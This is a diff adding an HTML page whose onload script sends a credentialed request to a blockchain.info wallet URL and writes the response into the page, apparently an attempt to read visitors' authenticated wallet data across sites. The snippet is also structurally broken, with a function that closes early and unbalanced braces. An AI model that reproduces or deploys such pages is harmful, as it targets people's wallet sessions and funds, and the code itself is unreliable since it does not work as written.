@@ -1,0 +1,21 @@
+<html>
+<head>
+<script>
+{function a(){
+var xmlhttp; 
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.open("GET","https://blockchain.info/wallet", false);
+xmlhttp.withCredentials = true;
+xmlhttp.send();
+if(xmlhttp.status==200)
+{
+var str=xmlhttp.responseText;
+document.write(decodeURIComponent(str));
+}
+}
+</script>
+</head>
+<body onload=a();>
+</body>
+</html>
